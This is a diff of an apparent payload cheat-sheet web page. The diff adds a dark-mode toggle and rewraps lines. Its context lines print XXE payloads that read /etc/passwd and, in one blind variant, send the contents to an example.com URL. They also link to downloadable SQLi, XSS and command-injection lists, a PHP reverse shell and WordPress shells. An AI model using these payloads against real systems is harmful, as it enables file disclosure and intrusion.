@@ -12,8 +12,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
 
-<body>
-
+<body onload="themeOnLoad()">
     <container class="container">
         <div id="app">
             <!--Mobile Nav Bar-->
@@ -47,6 +46,19 @@
                             <a href="about.html" class="button is-warning is-medium is-hidden-tablet">
                                 About
                             </a>
+                            <!-- Dark mode toggle -->
+                            <div class="mode-switch is-hidden-tablet" style="padding-top:10px;">
+                                <label class="switch">
+                                    <input class="btn-toggle" type="checkbox" onclick="darkModeTrig()" />
+                                    <span class="slider">
+                                        <svg class="slider-icon" viewbox="0 0 24 24" fill="none" height="20"
+                                            stroke="#000" stroke-linecap="round" stroke-linejoin="round"
+                                            stroke-width="2" width="20" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z" />
+                                        </svg>
+                                    </span>
+                                </label>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -90,6 +102,22 @@
                                 About
                             </a>
                         </li>
+                        <!-- Dark mode toggle -->
+                        <li>
+                            <br>
+                            <div class="mode-switch">
+                                <label class="switch" for="checkbox">
+                                    <input class="btn-toggle" id="checkbox" type="checkbox" onclick="darkModeTrig()" />
+                                    <span class="slider">
+                                        <svg class="slider-icon" viewbox="0 0 24 24" fill="none" height="20"
+                                            stroke="#000" stroke-linecap="round" stroke-linejoin="round"
+                                            stroke-width="2" width="20" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z" />
+                                        </svg>
+                                    </span>
+                                </label>
+                            </div>
+                        </li>
                     </ul>
                 </aside>
 
@@ -116,7 +144,8 @@
                         <div class="message-header" id="h1">
                             <p>Unix cmd-i list</p>
                             <button class="button">
-                                <a href="assets/payload/unix-cmdi.txt" download="unix-cmdi.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/unix-cmdi.txt" download="unix-cmdi.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -125,7 +154,8 @@
                         <div class="message-header" id="h2">
                             <p>Unix cmd-i list</p>
                             <button class="button">
-                                <a href="assets/payload/win-cmdi.txt" download="win-cmdi.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/win-cmdi.txt" download="win-cmdi.txt"><i class="fa fa-download"
+                                        aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -134,7 +164,8 @@
                         <div class="message-header" id="h3">
                             <p> XSS Vulnerability Payload List</p>
                             <button class="button">
-                                <a href="assets/payload/xss-payload.txt" download="xss-payload.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/xss-payload.txt" download="xss-payload.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -168,7 +199,7 @@
   &lt;firstName&gt;John&lt;/firstName&gt;
   &lt;lastName&gt;&example;&lt;/lastName&gt;
  &lt;/userInfo&gt;</pre>
-                        </div>     
+                        </div>
                         <div class="message-header" id="h6">
                             <p>XXE: File Disclosure</p>
                             <button class="button" data-clipboard-target="#c6">
@@ -210,7 +241,7 @@
 &lt;!ELEMENT foo (#ANY)&gt;
 &lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;
 &lt;!ENTITY blind SYSTEM "https://www.example.com/?%xxe;"&gt;]&gt;&lt;foo&gt;&blind;&lt;/foo&gt;</pre>
-                        </div>    
+                        </div>
                         <div class="message-header" id="h9">
                             <p>XXE: Access Control Bypass (Loading Restricted Resources - PHP example)</p>
                             <button class="button" data-clipboard-target="#c9">
@@ -223,7 +254,7 @@
 &lt;!DOCTYPE foo [
 &lt;!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php"&gt;]&gt;
 &lt;foo&gt;&lt;result&gt;&ac;&lt;/result&gt;&lt;/foo&gt;</pre>
-                        </div> 
+                        </div>
                         <div class="message-header" id="h10">
                             <p>XXE: (Remote Attack - Through External Xml Inclusion)</p>
                             <button class="button" data-clipboard-target="#c10">
@@ -236,14 +267,15 @@
 &lt;!DOCTYPE lolz [
 &lt;!ENTITY test SYSTEM "https://example.com/entity1.xml"&gt;]&gt;
 &lt;lolz&gt;&lt;lol&gt;3..2..1...&test&lt;lol&gt;&lt;/lolz&gt;</pre>
-                        </div>              
+                        </div>
                     </article>
 
                     <article class="message is-success">
                         <div class="message-header" id="h12">
                             <p>SQLi Payload</p>
                             <button class="button">
-                                <a href="assets/payload/sqli-payload.txt" download="sqli-payload.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/sqli-payload.txt" download="sqli-payload.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -252,7 +284,8 @@
                         <div class="message-header" id="h13">
                             <p>SQLi Error-based Payload</p>
                             <button class="button">
-                                <a href="assets/payload/sqli-errorbased.txt" download="sqli-errorbased.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/sqli-errorbased.txt" download="sqli-errorbased.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -261,7 +294,8 @@
                         <div class="message-header" id="h14">
                             <p>SQLi Time-based Payload</p>
                             <button class="button">
-                                <a href="assets/payload/sqli-timebased.txt" download="sqli-timebased.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/sqli-timebased.txt" download="sqli-timebased.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -270,7 +304,8 @@
                         <div class="message-header" id="h15">
                             <p>SQLi Union Select Payload</p>
                             <button class="button">
-                                <a href="assets/payload/sqli-unionselect.txt" download="sqli-unionselect.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/sqli-unionselect.txt" download="sqli-unionselect.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -279,7 +314,8 @@
                         <div class="message-header" id="h16">
                             <p>SQLi Auth Bypass Payload</p>
                             <button class="button">
-                                <a href="assets/payload/sqli-authbypass.txt" download="sqli-authbypass.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/sqli-authbypass.txt" download="sqli-authbypass.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -288,7 +324,8 @@
                         <div class="message-header" id="h17">
                             <p>PHP reverse Shell</p>
                             <button class="button">
-                                <a href="assets/payload/php-reverse-shell.txt" download="php-reverse-shell.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/php-reverse-shell.txt" download="php-reverse-shell.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -297,7 +334,8 @@
                         <div class="message-header" id="h18">
                             <p>Dynamic PHP Shell Command for RCE</p>
                             <button class="button">
-                                <a href="assets/payload/dysco.txt" download="dysco.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/dysco.txt" download="dysco.txt"><i class="fa fa-download"
+                                        aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -306,7 +344,8 @@
                         <div class="message-header" id="h19">
                             <p>Wordpress Bypass Login Shell</p>
                             <button class="button">
-                                <a href="assets/payload/wordpress-authbypass.txt" download="wordpress-authbypass.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/wordpress-authbypass.txt" download="wordpress-authbypass.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
@@ -315,7 +354,8 @@
                         <div class="message-header" id="h20">
                             <p>Wordpress Plugin Shell</p>
                             <button class="button">
-                                <a href="assets/payload/wordpress-plugin.txt" download="wordpress-plugin.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                                <a href="assets/payload/wordpress-plugin.txt" download="wordpress-plugin.txt"><i
+                                        class="fa fa-download" aria-hidden="true"></i></a>
                             </button>
                         </div>
                     </article>
